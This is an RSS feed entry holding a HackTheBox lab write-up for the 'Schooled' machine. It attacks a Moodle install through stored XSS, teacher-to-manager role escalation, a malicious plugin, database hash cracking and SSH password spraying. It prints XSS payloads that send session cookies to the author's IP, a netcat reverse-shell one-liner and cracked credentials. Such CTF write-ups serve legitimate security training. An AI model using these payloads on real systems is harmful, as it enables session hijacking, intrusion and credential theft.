<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>XSS on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/xss/</link>
    <description>Recent content in XSS on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 16 Sep 2021 18:22:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/xss/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Schooled</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</link>
      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</guid>
      <description>Use XSS to manipulate your moodle score</description>
      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials, allowing me to recover a password from the database. The password is reused by one of the users for SSH login. The user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and this can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing cookie with XSS</li>
<li>Moodle exploitation</li>
<li>Sudo exploitation on <code>pkg</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
Nmap scan report <span class="k">for</span> 10.10.10.234
Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
...<span class="o">[</span>SNIP<span class="o">]</span>...
Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
<p>Port 80 serving a homepage of a school institution.</p>
<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
</p>
<p>In the About section, it states that this school has an online learning system using Moodle.</p>
<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
</p>
<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
</p>
<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
<span class="m">20750</span>
→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
<span class="m">20750</span>
</code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
<span class="o">[</span>+<span class="o">]</span> Method:       GET
<span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
</code></pre></div><p>I will update <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
</code></pre></div><p>And it&rsquo;s different site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
<span class="m">84</span>
<span class="m">20750</span>
</code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>, and there are four courses available here.</p>
<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
</p>
<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
<h4 id="account-register">Account Register</h4>
<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
</p>
<p>I will change my email domain and login afterwards.</p>
<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
<h4 id="enroll-course">Enroll course</h4>
<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
</p>
<p>On the Mathematics course, there are two announcements .</p>
<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
</p>
<p>The oldest announcement by Jamie Borham is just a welcome message.</p>
<p><div class="img-container"><img src="imgs/image-20210518175145618.png" alt="image-20210518175145618"  /></div>
</p>
<p>The one that titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
</p>
<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<h4 id="exploit-db">Exploit-DB</h4>
<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
<ul>
<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
</p>
<h4 id="moodle-security">Moodle Security</h4>
<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>.</p>
<p>Searching page by page, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
</p>
<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
</p>
<h3 id="testing-xss">Testing XSS</h3>
<h4 id="moodle-3103---label-persistent-cross-site-scripting">Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting</h4>
<p>I tried <code>Moodle 3.10.3 - 'label' Persistent Cross Site Scripting</code> using the following payload.</p>
<pre tabindex="0"><code>&lt;img src=&quot;http://10.10.14.49/iamf.js&quot; onerror=&quot;alert('iamf')&quot; /&gt;
</code></pre><p><div class="img-container"><img src="imgs/image-20210518214318578.png" alt="image-20210518214318578"  /></div>
</p>
<p>It worked.</p>
<p><div class="img-container"><img src="imgs/image-20210518214351609.png" alt="image-20210518214351609"  /></div>
</p>
<p>Unfortunately, it&rsquo;s an XHR. I didn&rsquo;t know how to get the link, and probably teacher won&rsquo;t look into the calendar or respond to my chat (phishing). But, based on this attempt, it seems the currently hosted Moodle version is &lt; 3.10.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>Or this one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
</p>
<p>After a few minutes, there is a request coming to my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ nc -nvlp <span class="m">80</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
Host: 10.10.14.49
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
Accept: image/webp,*/*
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
</p>
<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
</p>
<p>Now I can confirm that this Moodle version by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>, and it&rsquo;s 3.9.</p>
<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
<p>The version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193">walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
<p>The first step is to join a teacher to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
</p>
<p>I will choose Jamie Borham and enroll it to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
</p>
<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
</p>
<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
</p>
<p>With manager role, I have the ability to impersonate my participants, which means they have to be on my course (mathematics) firstm using &ldquo;Login as&rdquo; function. For example:</p>
<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
</p>
<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
</p>
<h4 id="malicious-plugin">Malicious Plugin</h4>
<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
</p>
<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
</p>
<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
</p>
<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
</p>
<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
</p>
<p>I will just continue on the installation process.</p>
<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
</p>
<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</code></pre></div><p>On my listener:</p>
<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
</p>
<p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
$ which stty
which stty
/bin/stty
$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
→ root@kali «exploits» «10.10.14.49» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>

$ ls -l
total <span class="m">0</span>
$ ls -la
total <span class="m">0</span>
$ <span class="nb">pwd</span>
/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jamie">Shell as jamie</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
$ ls -l /home/
total <span class="m">17</span>
drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
</code></pre></div><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat config.php 
&lt;?php  // Moodle configuration file

unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
global <span class="nv">$CFG</span><span class="p">;</span>
<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
<span class="o">)</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>

require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
</code></pre></div><h4 id="mysql">MySQL</h4>
<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
Your MySQL connection id is <span class="m">7517</span>
Server version: 8.0.23 Source distribution

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
<span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
<h4 id="crack-hash">Crack hash</h4>
<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt

...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="password-spray">Password Spray</h4>
<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</code></pre></div><h4 id="ssh">SSH</h4>
<p>Now I can login as jamie via SSH.</p>
